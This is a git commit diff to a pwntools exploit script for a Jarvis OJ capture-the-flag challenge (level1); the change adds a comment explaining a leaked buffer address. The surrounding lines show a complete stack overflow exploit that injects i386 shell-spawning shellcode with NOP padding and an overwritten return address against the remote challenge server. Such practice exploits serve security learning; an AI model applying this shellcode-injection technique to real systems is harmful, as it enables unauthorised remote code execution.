b1b020e4d1a4de4028a92d1f2cedc9149e8ef06a
AlmostDontCount <1245550993@qq.com>
2018-10-08 20:10:28 +0800

    Update exp_level1.py

--- pwn/jarvis_oj/level1/exp_level1.py
+++ pwn/jarvis_oj/level1/exp_level1.py
@@ -3,7 +3,7 @@ p = remote('pwn2.jarvisoj.com',9877)
 
 sh = asm(shellcraft.i386.sh())
 
-p_buf = int(p.recv()[-10:-2],16)
+p_buf = int(p.recv()[-10:-2],16)#the address of ebp-0x88 is printed out
 
 p.sendline(sh+(0x8c-len(sh))*'\x90'+p32(p_buf))
 
